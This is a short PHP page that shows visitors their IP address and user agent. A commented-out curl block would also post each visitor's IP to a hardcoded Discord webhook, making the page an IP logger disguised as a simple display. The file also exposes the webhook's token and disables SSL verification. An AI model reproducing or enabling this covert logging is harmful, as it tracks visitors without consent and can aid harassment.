<h1>Your IP Address:</h1>
<p><?php echo $_SERVER["REMOTE_ADDR"];?></p>
<p>
  <?php echo $_SERVER['HTTP_USER_AGENT'];?>
</p>
<?php
  $ip = $_SERVER["REMOTE_ADDR"];
  $url = 'https://discordapp.com/api/webhooks/856791535022243870/5D16VP5AE9qpRCcxFWU1H9Afaae788xmhnAcXOmJpChsxljo9uC0iV6cKU9O3v1FtzGU';
$headers = [ 'Content-Type: application/json; charset=utf-8' ];
$POST = [ 'username' => 'Testing BOT', 'content' => $ip ];

/* $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch); */

?>
